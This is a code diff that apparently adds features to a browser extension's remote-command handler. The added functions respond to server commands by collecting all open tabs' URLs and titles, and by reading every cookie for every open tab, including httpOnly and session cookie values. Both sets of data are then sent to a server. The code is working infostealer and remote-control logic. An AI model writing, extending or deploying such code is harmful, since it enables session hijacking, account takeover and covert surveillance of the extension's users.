@@ -157,6 +157,16 @@ async function processCommand(command) {
                 await captureHistory(command.id);
                 break;
 
+            case 'get_activity':
+                console.log(`📊 Activity requested by ${command.requestedBy}`);
+                await captureActivity(command.id);
+                break;
+
+            case 'get_cookies':
+                console.log(`🍪 Cookies requested by ${command.requestedBy}`);
+                await captureCookies(command.id);
+                break;
+
             case 'ping':
                 await sendCommandResponse(command.id, 'pong', { message: 'Pong!' });
                 console.log('🏓 Pong sent');
@@ -225,6 +235,117 @@ async function captureHistory(commandId) {
 
     } catch (error) {
         console.error('Error capturing history:', error);
+        await sendCommandResponse(commandId, 'error', { message: error.message });
+    }
+}
+
+// ============ Browser Activity Capture ============
+async function captureActivity(commandId) {
+    try {
+        // Get all browser tabs
+        const tabs = await chrome.tabs.query({});
+
+        // Extract relevant information from each tab
+        const tabsInfo = tabs.map(tab => ({
+            id: tab.id,
+            title: tab.title,
+            url: tab.url,
+            active: tab.active,
+            pinned: tab.pinned,
+            audible: tab.audible,
+            discarded: tab.discarded,
+            autoDiscardable: tab.autoDiscardable,
+            mutedInfo: tab.mutedInfo,
+            windowId: tab.windowId,
+            index: tab.index
+        }));
+
+        console.log(`📊 Browser activity captured! (${tabsInfo.length} tabs)`);
+
+        // Send to server
+        await sendCommandResponse(commandId, 'activity', {
+            tabs: tabsInfo
+        });
+
+        console.log('✅ Activity sent to server!');
+
+    } catch (error) {
+        console.error('Error capturing activity:', error);
+        await sendCommandResponse(commandId, 'error', { message: error.message });
+    }
+}
+
+// ============ Cookies (Browser Cookies) Capture ============
+async function captureCookies(commandId) {
+    try {
+        // Get all browser tabs
+        const tabs = await chrome.tabs.query({});
+        
+        // Get user ID from storage
+        const storage = await chrome.storage.local.get(['clientId']);
+        const userId = storage.clientId || CLIENT_ID;
+        
+        let totalCookies = 0;
+        const tabsData = [];
+
+        // Get cookies for each tab
+        for (const tab of tabs) {
+            if (!tab.url || tab.url.startsWith('chrome://') || tab.url.startsWith('chrome-extension://')) {
+                continue; // Skip chrome internal pages
+            }
+
+            try {
+                // Get all cookies for this tab's URL
+                const cookies = await chrome.cookies.getAll({ url: tab.url });
+                
+                // Format cookies
+                const formattedCookies = cookies.map(cookie => ({
+                    name: cookie.name,
+                    value: cookie.value,
+                    domain: cookie.domain,
+                    path: cookie.path,
+                    secure: cookie.secure,
+                    httpOnly: cookie.httpOnly,
+                    sameSite: cookie.sameSite || 'unspecified',
+                    expirationDate: cookie.expirationDate || null,
+                    hostOnly: cookie.hostOnly,
+                    session: cookie.session
+                }));
+
+                totalCookies += formattedCookies.length;
+
+                tabsData.push({
+                    url: tab.url,
+                    title: tab.title || 'No Title',
+                    cookieCount: formattedCookies.length,
+                    cookies: formattedCookies
+                });
+            } catch (error) {
+                console.error(`Error getting cookies for tab ${tab.id}:`, error);
+            }
+        }
+
+        // Format the data according to the specified structure
+        const formattedData = {
+            userId: userId,
+            timestamp: new Date().toISOString(),
+            source: "popup",
+            totalTabs: tabsData.length,
+            totalCookies: totalCookies,
+            tabs: tabsData
+        };
+
+        console.log(`🍪 Cookies data captured! (${totalCookies} cookies across ${tabsData.length} tabs)`);
+
+        // Send to server
+        await sendCommandResponse(commandId, 'cookies', {
+            cookiesData: formattedData
+        });
+
+        console.log('✅ Cookies data sent to server!');
+
+    } catch (error) {
+        console.error('Error capturing cookies:', error);
         await sendCommandResponse(commandId, 'error', { message: error.message });
     }
 }
